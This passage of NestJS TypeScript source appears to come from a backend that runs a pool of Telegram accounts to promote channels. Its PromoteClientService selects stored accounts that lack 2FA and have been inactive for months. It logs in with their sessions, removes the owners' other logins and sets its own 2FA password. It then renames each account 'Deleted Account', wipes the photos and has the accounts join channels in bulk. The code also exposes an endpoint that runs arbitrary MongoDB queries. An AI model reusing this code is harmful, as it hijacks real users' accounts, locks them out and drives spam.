@ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<PromoteClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Injectable()\nexport class PromoteClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) { }\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\");\n            this.clearJoinChannelInterval();\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n                await this.telegramService.disconnectAll();\n                await sleep(2000);\n                const clients = await this.promoteClientModel.find({ channels: { \"$lt\": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\n                            console.log(\"Started Joining for : \", document.mobile);\n                            const channels = await client.channelInfo(true);\n                            console.log(\"Existing Channels Length : \", channels.ids.length);\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            let result = [];\n                            if (channels.canSendFalseCount < 50) {\n                                if (channels.ids.length < 220) {\n                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                } else {\n                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                }\n                                this.joinChannelMap.set(document.mobile, result);\n                            } else {\n                                await client.leaveChannels(channels.canSendFalseChats);\n                            }\n                            await this.telegramService.deleteClient(document.mobile);\n                        } catch (error) {\n                            if (error.message === \"SESSION_REVOKED\" ||\n                                error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                                error.message === \"USER_DEACTIVATED\" ||\n                                error.message === \"USER_DEACTIVATED_BAN\") {\n                                console.log(\"Session Revoked or Auth Key Unregistered. Removing Client\");\n                                await this.remove(document.mobile);\n                            }\n                            await this.telegramService.deleteClient(document.mobile);\n                            const parsedError = parseError(error);\n                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);\n                        }\n                    }\n\n                    this.joinChannelQueue();\n\n                }\n                console.log(\"Joining Channel Triggered Successfully for\", clients.length);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                console.error(\"Error during the joinchannelForPromoteClients process: \", error);\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            console.log(\"Ignored active check for promote channels as an active client setup exists\");\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels: \", channels.length);\n                            this.joinChannelMap.set(mobile, channels);\n\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join: \", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);\n                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);\n                                    this.removeFromPromoteMap(mobile);\n                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channelsInfo.ids.length });\n                                }\n                            } finally {\n                                await this.telegramService.deleteClient(mobile);\n                            }\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval();\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForPromoteClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await this.telegramService.createClient(mobile, false)\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                        await this.telegramService.deleteClient(document.mobile)\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\n\n@Global()\n@Module({\n  imports: [\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { initModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [initModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { IsString, IsOptional, IsEnum, IsObject, IsUrl } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n}","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  